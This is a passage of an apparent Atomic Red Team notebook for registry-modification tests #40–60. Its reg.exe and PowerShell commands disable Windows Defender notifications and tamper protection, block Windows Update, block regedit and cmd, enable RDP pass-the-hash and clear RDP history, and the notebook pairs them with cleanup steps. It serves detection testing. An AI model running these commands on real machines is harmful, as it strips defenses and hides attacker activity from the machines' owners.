   "source": "#### Cleanup: \n```cmd\nreg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /va /f >nul 2>&1\nreg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5b9f4520",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 40 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ae335e4b",
   "metadata": {},
   "source": "### Atomic Test #41 - Terminal Server Client Connection History Cleared\nThe built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Must have the \"MR9\" Remote Desktop Connection history Key \n\n##### Check Prereq Commands:\n```cmd\nif ((Get-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\\\").MR9) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\\" -name \"Terminal Server Client\"  -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\\" -name \"Default\" -ErrorAction Ignore\nNew-Itemproperty -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\" -name \"MR9\" -value \"127.0.0.1\"  -PropertyType \"String\" -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\\" -name \"Servers\" -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers\" -name \"Redcanary\" -ErrorAction Ignore\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fe68de17",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 41 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "66c929ae",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "20d3a286",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 41"
  },
  {
   "cell_type": "markdown",
   "id": "0c409dc6",
   "metadata": {},
   "source": [
    "### Atomic Test #42 - Disable Windows Error Reporting Settings",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems \nencounter in specific application or process.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "54def5cd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 42"
  },
  {
   "cell_type": "markdown",
   "id": "61bce4be",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1\nreg delete HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "73b266e8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 42 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d2dcab4f",
   "metadata": {},
   "source": [
    "### Atomic Test #43 - DisallowRun Execution Of Certain Applications",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it \nusing security product.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art1 /d \"regedit.exe\"\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art2 /d \"cmd.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0fe5c598",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 43"
  },
  {
   "cell_type": "markdown",
   "id": "6b0c08b5",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /f >nul 2>&1\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art1 /f >nul 2>&1\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art2 /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c4dd6a37",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 43 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5d565e2b",
   "metadata": {},
   "source": [
    "### Atomic Test #44 - Enabling Restricted Admin Mode via Command_Prompt",
    "Enabling Restricted Admin Mode via Command_Prompt,enables an attacker to perform a pass-the-hash attack using RDP.\n\nSee [Passing the Hash with Remote Desktop](https://www.kali.org/blog/passing-hash-remote-desktop/)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e2308d2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 44"
  },
  {
   "cell_type": "markdown",
   "id": "8cf224c8",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "504b259f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 44 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9202d2ea",
   "metadata": {},
   "source": [
    "### Atomic Test #45 - Mimic Ransomware - Enable Multiple User Sessions",
    "This test emulates Mimic ransomware's ability to enable multiple user sessions by modifying the AllowMultipleTSSessions value within the Winlogon registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "54826491",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 45"
  },
  {
   "cell_type": "markdown",
   "id": "42ac2c43",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /v AllowMultipleTSSessions /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "add0495c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 45 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f301fbb7",
   "metadata": {},
   "source": [
    "### Atomic Test #46 - Mimic Ransomware - Allow Multiple RDP Sessions per User",
    "This test emulates Mimic ransomware's ability to enable multiple RDP sessions per user by modifying the fSingleSessionPerUser value within the Terminal Server registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f40702f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 46"
  },
  {
   "cell_type": "markdown",
   "id": "978596f0",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2be3daab",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 46 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "eefeeab7",
   "metadata": {},
   "source": [
    "### Atomic Test #47 - Event Viewer Registry Modification - Redirection URL",
    "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will open the URL or execute the program defined in the redirection URL registry entry.",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"file://C:\\windows\\system32\\notepad.exe\" /f```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "876bee8a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 47"
  },
  {
   "cell_type": "markdown",
   "id": "8a07da19",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"http://go.microsoft.com/fwlink/events.asp\" /f```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "39460558",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 47 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e0324d79",
   "metadata": {},
   "source": [
    "### Atomic Test #48 - Event Viewer Registry Modification - Redirection Program",
    "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will execute the program defined in the redirection program registry entry.",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"C:\\windows\\system32\\notepad.exe\" /f```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9fcbcac8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 48"
  },
  {
   "cell_type": "markdown",
   "id": "f3e2c83c",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /f```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c705b6e6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 48 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "02e6be2c",
   "metadata": {},
   "source": [
    "### Atomic Test #49 - Enabling Remote Desktop Protocol via Remote Registry",
    "Enabling RDP through remote registry.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba0fddfb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 49"
  },
  {
   "cell_type": "markdown",
   "id": "e4f680c2",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 2 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "04c4c736",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 49 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "13fc9105",
   "metadata": {},
   "source": [
    "### Atomic Test #50 - Disable Win Defender Notification",
    "Disable Win Defender Notification. Redline is using this to disable this win defender feature.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5c264704",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 50"
  },
  {
   "cell_type": "markdown",
   "id": "d8c75c27",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 0 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3bbe128c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 50 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "60da148f",
   "metadata": {},
   "source": [
    "### Atomic Test #51 - Disable Windows OS Auto Update",
    "Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7889e8f1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 51"
  },
  {
   "cell_type": "markdown",
   "id": "3a5c18ee",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 0 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c65b8637",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 51 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7aeb9683",
   "metadata": {},
   "source": [
    "### Atomic Test #52 - Disable Windows Auto Reboot for current logon user",
    "Disable Windows Auto Reboot for current logon user. Redline is using this as part of its defense evasion.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ed37dc04",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 52"
  },
  {
   "cell_type": "markdown",
   "id": "521a80d5",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 0 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "54435e04",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 52 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d317b0b1",
   "metadata": {},
   "source": [
    "### Atomic Test #53 - Windows Auto Update Option to Notify before download",
    "Windows Auto Update Option to Notify before download. Redline is using this as part of its defense evasion.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 2 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "99e08bcd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 53"
  },
  {
   "cell_type": "markdown",
   "id": "d9d653ba",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 3 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ef154a68",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 53 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "561fd2a1",
   "metadata": {},
   "source": [
    "### Atomic Test #54 - Do Not Connect To Win Update",
    "Do Not Connect To Win Update. Redline is using this as part of its defense evasion.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e421a751",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 54"
  },
  {
   "cell_type": "markdown",
   "id": "b4f04d44",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 0 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2ee93dd0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 54 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8a12f0cd",
   "metadata": {},
   "source": [
    "### Atomic Test #55 - Tamper Win Defender Protection",
    "Tamper Win Defender Protection. RedLine Stealer is executing another component file to modify this win defender feature in registry. \nTake note that this modification might not be enough to disable this feature but can be a good indicator of malicious process that \ntries to tamper this Win Defender feature settings.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "63d52159",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 55"
  },
  {
   "cell_type": "markdown",
   "id": "6ac7315b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 5 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "51073f63",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 55 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "16dc8143",
   "metadata": {},
   "source": [
    "### Atomic Test #56 - Snake Malware Registry Blob",
    "The following Atomic Test creates a registry blob in HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, which is related to Snake Malware. Per the report, upon execution, Snake's WerFault.exe will attempt to decrypt an encrypted blob within the Windows\nregistry that is typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake's kernel driver and kernel driver loader.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -Value $randomBytes -PropertyType Binary -Force | Out-Null\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6c13ddea",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 56"
  },
  {
   "cell_type": "markdown",
   "id": "4dc47775",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; Remove-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -ErrorAction SilentlyContinue | Out-Null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6acfd6dc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 56 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "bff0bd61",
   "metadata": {},
   "source": [
    "### Atomic Test #57 - Allow Simultaneous Download Registry",
    "A registry modification to allow Simultaneous download in the system.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /d 10 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /d 10 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fe85fbbd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 57"
  },
  {
   "cell_type": "markdown",
   "id": "0c10fb1d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /f\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7e4944d5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 57 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "fc7fd6ab",
   "metadata": {},
   "source": [
    "### Atomic Test #58 - Modify Internet Zone Protocol Defaults in Current User Registry - cmd",
    "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using the reg.exe utility via the command prompt. Such modifications can be indicative of an adversary trying to weaken browser security settings. Upon execution, if successful, the message \"The operation completed successfully.\" will be displayed.\nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```batch\nreg query \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\"\n```\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0191b7b9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 58"
  },
  {
   "cell_type": "markdown",
   "id": "7244a79b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 3 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 3 /F\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f5d004d4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 58 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4ccbc8e3",
   "metadata": {},
   "source": [
    "### Atomic Test #59 - Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell",
    "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using PowerShell. Such modifications can be indicative of an adversary attempting to weaken browser security settings. \nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```powershell\nGet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' | Select-Object http,https\n```\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n# Set the registry values for http and https to 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 0\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0420a6db",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 59"
  },
  {
   "cell_type": "markdown",
   "id": "bcb977c6",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n# Restore the registry values for http and https to 3\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 3\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 3\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9bcc3746",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 59 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0769da6e",
   "metadata": {},
   "source": [
    "### Atomic Test #60 - Activities To Disable Secondary Authentication Detected By Modified Registry Value.",
    "Detect the disable secondary authentication activities that adversary attempt to bypass MFA and to get the unauthorized access to the system or sensitive data.\nSee the related article (https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.SecondaryAuthenticationFactor::MSSecondaryAuthFactor_AllowSecondaryAuthenticationDevice).\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
